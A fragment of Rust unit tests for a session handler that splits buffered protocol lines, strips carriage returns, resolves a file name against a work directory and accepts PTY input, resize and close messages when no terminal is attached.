    #[test]
    fn splits_lines_and_keeps_partial() {
        let mut session = session();
        session.buffer = b"PONG\nFILE_END:3:OK\npartial".to_vec();
        session.take_lines();
        assert_eq!(session.lines.len(), 2);
        assert_eq!(session.lines[0], "PONG");
        assert_eq!(session.lines[1], "FILE_END:3:OK");
        assert_eq!(session.buffer, b"partial");
    }

    #[test]
    fn strips_carriage_return() {
        let mut session = session();
        session.buffer = b"PONG\r\n".to_vec();
        session.take_lines();
        assert_eq!(session.lines.pop_front().unwrap(), "PONG");
    }

    #[test]
    fn resolves_relative_to_workdir() {
        let session = session();
        assert_eq!(
            session.resolve("payload.ps1"),
            session.config.workdir.join("payload.ps1")
        );
    }

    #[test]
    fn ignores_keyboard_input_without_terminal() {
        let mut session = session();
        assert!(session.on_pty_in("7:AAAA").is_ok());
        assert!(session.on_pty_resize("7:80:24").is_ok());
        assert!(session.on_pty_close("7").is_ok());
    }
}
